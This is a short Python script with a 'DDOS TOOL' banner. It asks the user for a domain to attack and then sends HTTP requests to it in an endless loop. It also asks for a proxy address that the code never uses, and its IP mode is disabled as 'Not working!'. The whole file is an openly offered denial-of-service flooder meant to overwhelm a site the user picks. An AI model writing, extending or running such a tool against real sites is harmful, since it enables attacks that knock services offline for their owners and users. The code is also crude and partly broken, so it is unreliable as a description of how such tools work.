from urllib import request
from urllib.parse import unquote


print('''██████╗ ██████╗  ██████╗ ███████╗          
██╔══██╗██╔══██╗██╔═══██╗██╔════╝          
██║  ██║██║  ██║██║   ██║███████╗          
██║  ██║██║  ██║██║   ██║╚════██║          
██████╔╝██████╔╝╚██████╔╝███████║          
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝          
                                           
        ████████╗ ██████╗  ██████╗ ██╗     
        ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
           ██║   ██║   ██║██║   ██║██║     
           ██║   ██║   ██║██║   ██║██║     
           ██║   ╚██████╔╝╚██████╔╝███████╗
           ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                           

''')

print()
print()
print()
print()
print()
print()
print()


'''
url = input("Enter the IP Adress or the domain of the site you wanna DDoS: ")
print()

proxyip = input("Enter the proxy IP Adress (without port): ")
print()

proxyport = input("Insert the proxy port: ")
print()

proxy = proxyip + ":" + proxyport
target = "http://wwww." + url
'''

while True:
	print('''Enter 1 to select IP mode.
Enter 2 to select domain mode.''')
	mode = input()
	if mode == "1":
		print("Not working!")
		print()
		'''
		ip = input("Insert the IP Adress you want to DDoS: ")
		target = ip
		proxyip = input("Enter the proxy IP Adress (without port): ")
		print()
		proxyport = input("Insert the proxy port: ")
		print()
		proxy = proxyip + ":" + proxyport
		req = request.Request(target)
		response = request.urlopen(req)
		print(response.read().decode('utf8'))
		input()
		'''

	elif mode == "2":
		url = input("Insert the domain you want to DDoS: ")
		target = "http://www." + url
		proxy = "176.115.73.8:2013"
		proxyip = input("Enter the proxy IP Adress (without port): ")
		print()
		proxyport = input("Insert the proxy port: ")
		print()
		proxy = proxyip + ":" + proxyport
		while True:
			req = request.Request(target)
			response = request.urlopen(req)
			'''
			print(response.read().decode('utf8'))
			input()
			'''

	else:
		print("Please enter a valid number.")